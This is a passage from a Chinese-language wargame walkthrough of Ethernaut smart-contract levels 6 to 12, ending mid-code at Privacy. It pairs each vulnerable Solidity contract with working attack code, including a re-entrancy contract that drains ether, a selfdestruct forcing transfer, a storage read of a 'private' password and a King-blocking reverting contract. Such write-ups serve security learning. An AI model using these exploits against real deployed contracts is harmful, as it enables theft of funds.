  * `call` 外部调用时，上下文是外部合约
  * `delegatecall` 外部调用时，上下文是调用合约
在本题中，`Delegation` 合约中的 `delegatecall` 函数参数可控，导致可以在合约内部执行任意函数，只需调用 `Delegate`
合约中的 `pwn` 函数，即可将 owner 变成自己。
    contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});
## 7\. Force
    pragma solidity ^0.4.18;
    contract Force {/*
                       MEOW ?
             /_/   /
        ____/ o o 
      /~____  =ø= /
     (______)__m_m)
    */}
刚看到这个合约是一脸懵逼的。
回头看了下题目要求：使合约 balance 大于 0  
然而这个空合约并没有任何地方可以收钱
这里用到智能合约的一个 trick，当一个合约调用 `selfdestruct` 函数，也就是自毁时，可以将所有存款发给另一个合约，并且强制对方收下。  
所有只需要再部署一个合约，打一点钱，然后自毁，把剩余金额留给目标合约。
    pragma solidity ^0.4.18;
    contract Attack {
        address instance_address = instance_address_here;
        function Attack() payable{}
        function hack() public {
            selfdestruct(instance_address);
        }
    }
调用 `hack()`函数，然后当场去世。
可以看到，Attack 合约在自毁的时候，将余额 1 wei 转给了 Force 合约。
## 8\. Vault
    pragma solidity ^0.4.18;
    contract Vault {
      bool public locked;
      bytes32 private password;
      function Vault(bytes32 _password) public {
        locked = true;
        password = _password;
      }
      function unlock(bytes32 _password) public {
        if (password == _password) {
          locked = false;
        }
      }
    }
通关条件
  * 使 `locked = false`
合约逻辑很简单，需要知道 `password` 来解锁合约，而 `password` 属性设置了 `private`，无法被其他合约直接访问。
解决该问题的关键点在于，这是一个部署在区块链上的智能合约，而区块链上的所有信息都是公开的。
可以用 `getStorageAt` 函数来访问合约里变量的值。合约里一共两个变量，`password` 第二个声明，position 为
1。翻一下文档，`getStorageAt` 函数需要带上回调函数，可以选择直接把返回结果 alert 出来。
    web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(web3.toAscii(y))});
    // A very strong secret password :)
    contract.unlock('A very strong secret password :)')
提交之后能看到，Zeppelin 给出的建议是：为确保数据私密，在将数据放入区块链之前需要对其进行加密，并且解密密钥不应该在链上发送。
## 9\. King
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract King is Ownable {
      address public king;
      uint public prize;
      function King() public payable {
        king = msg.sender;
        prize = msg.value;
      }
      function() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
    }
合约代码逻辑很简单，谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King
的位置，需要解题者阻止其他人成为 King。
首先需要讨论一下 Solidity 中几种转币方式。
`.transfer()`
  * 当发送失败时会 `throw;` 回滚状态
  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
`.send()`
  * 当发送失败时会返回 false
  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
`.call.value()()`
  * 当发送失败时会返回 false
  * 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）
回头再看一下代码，当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 `transfer()`。上面提到，当
`transfer()` 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。
首先查看一下当前最高出价
    fromWei((await contract.prize()).toNumber())
    // 1 eth
部署一个新的合约，当收到转账时主动抛出错误。
    pragma solidity ^0.4.18;
    contract Attack {
        address instance_address = instance_address_here;
        function Attack() payable{}
        function hack() public {
            instance_address.call.value(1.1 ether)();
        }
        function () public {
            revert();
        }
    }
调用 `hack()`， 成为新的 King
Submit instance 之后，仍然是 King
## 10\. Re-entrancy
    pragma solidity ^0.4.18;
    contract Reentrance {
      mapping(address => uint) public balances;
      function donate(address _to) public payable {
        balances[_to] += msg.value;
      }
      function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
      }
      function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
          if(msg.sender.call.value(_amount)()) {
            _amount;
          }
          balances[msg.sender] -= _amount;
        }
      }
      function() public payable {}
    }
DASP 排第一的重入漏洞，也是之前比较著名的 DAO 事件里使用到的方法
漏洞主要在于 `withdraw()` 函数，合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用
`msg.sender.call.value(amount)()` 来发送 Ether，处理完成后相应修改用户资产数据。
在提币的过程中，存在一个递归 withdraw 的问题（因为资产修改在转币之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 Ether
全部提出。
再复习一下 Solidity 中几种转币方式。
`.transfer()`
  * 当发送失败时会 `throw;` 回滚状态
  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
`.send()`
  * 当发送失败时会返回 false
  * 只会传递部分 Gas 供调用，防止重入（reentrancy）
`.call.value()()`
  * 当发送失败时会返回 false
  * 传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）
使用 `msg.sender.call.value(amount)()` 传递了所有可用 Gas 供调用，也是可以成功执行递归的前提条件。
查看题目合约地址信息，可以看到在初始化时转入了 1 ether，我们需要把目标合约的余额提出到自己的合约上。
部署合约
    pragma solidity ^0.4.18;
    contract Reentrance {
      mapping(address => uint) public balances;
      function donate(address _to) public payable {
        balances[_to] += msg.value;
      }
      function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
      }
      function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
          if(msg.sender.call.value(_amount)()) {
            _amount;
          }
          balances[msg.sender] -= _amount;
        }
      }
      function() public payable {}
    }
    contract Attack {
        address instance_address = instance_address_here;
        Reentrance target = Reentrance(instance_address);
        function Attack() payable{}
        function donate() public payable {
            target.donate.value(msg.value)(this);
        }
        function hack() public {
            target.withdraw(0.5 ether);
        }
        function get_balance() public view returns(uint) {
            return target.balanceOf(this);
        }
        function my_eth_bal() public view returns(uint) {
            return address(this).balance;
        }
        function ins_eth_bal() public view returns(uint) {
            return instance_address.balance;
        }
        function () public payable {
            target.withdraw(0.5 ether);
        }
    }
初始状态
  * balance 为 0
  * `Reentrance` 账户余额 1 ether
  * `Attack` 账户余额 0 ether  
调用 `donate()` 以攻击者合约的身份向题目地址转账 1 ether
  * balance 为 1
  * `Reentrance` 账户余额 2 ether
  * `Attack` 账户余额 0 ether  
调用 `hacker()` 赎回 0.5 ether，回调函数递归调用 `withdraw()`，触发重入漏洞
  * balance 下溢
  * `Reentrance` 账户余额 0 ether
  * `Attack` 账户余额 2 ether  
成功将题目账户中本不属于我们 1 ether 也提出。
出题人给出的建议是，使用较为安全的 `transfer()` 来进行转币操作。
## 11\. Elevator
    pragma solidity ^0.4.18;
    interface Building {
      function isLastFloor(uint) view public returns (bool);
    }
    contract Elevator {
      bool public top;
      uint public floor;
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (! building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
通关条件
  * 使 `contract.top` 为 `true`
`Building` 接口中声明了 `isLastFloor` 函数，用户可以自行编写。
在主合约中，先调用 `building.isLastFloor(_floor)` 进行 if 判断，然后将
`building.isLastFloor(_floor)` 赋值给 `top` 。要使 `top = true`，则
`building.isLastFloor(_floor)` 第一次调用需返回 `false`，第二次调用返回 `true`。
思路也很简单，设置一个初始值为 `true` 的变量，每次调用 `isLastFloor()` 函数时，将其取反再返回。
不过，题目中在声明 `isLastFloor` 函数时，赋予了其 `view` 属性，`view` 表示函数会读取合约变量，但是不会修改任何合约的状态。
回头看了下题目给的提示
  * Sometimes solidity is not good at keeping promises.
  * This Elevator expects to be used from a Building.
翻了下文档，找到了对 `view` 的描述：
> view functions: The compiler does not enforce yet that a view method is not
> modifying state.
函数在保证不修改状态情况下可以被声明为视图（view）的形式。但这是松散的，当前 Solidity 编译器没有强制执行视图函数（view
function）不能修改状态。
那么上述做法就是可行的了。部署合约：
    pragma solidity ^0.4.18;
    interface Building {
      function isLastFloor(uint) view public returns (bool);
    }
    contract Elevator {
      bool public top;
      uint public floor;
      function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (! building.isLastFloor(_floor)) {
          floor = _floor;
          top = building.isLastFloor(floor);
        }
      }
    }
    contract Attack {
        address instance_address = instance_address_here;
        Elevator target = Elevator(instance_address);
        bool public isLast = true;
        function isLastFloor(uint) public returns (bool) {
            isLast = ! isLast;
            return isLast;
        }
        function hack() public {
            target.goTo(1024);
        }
    }
调用 `hack()` 函数，成功将 `contract.top` 修改为 `true`
## 12\. Privacy
    pragma solidity ^0.4.18;
    contract Privacy {
      bool public locked = true;
      uint256 public constant ID = block.timestamp;
      uint8 private flattening = 10;
      uint8 private denomination = 255;
      uint16 private awkwardness = uint16(now);
      bytes32[3] private data;
      function Privacy(bytes32[3] _data) public {
        data = _data;
      }
      function unlock(bytes16 _key) public {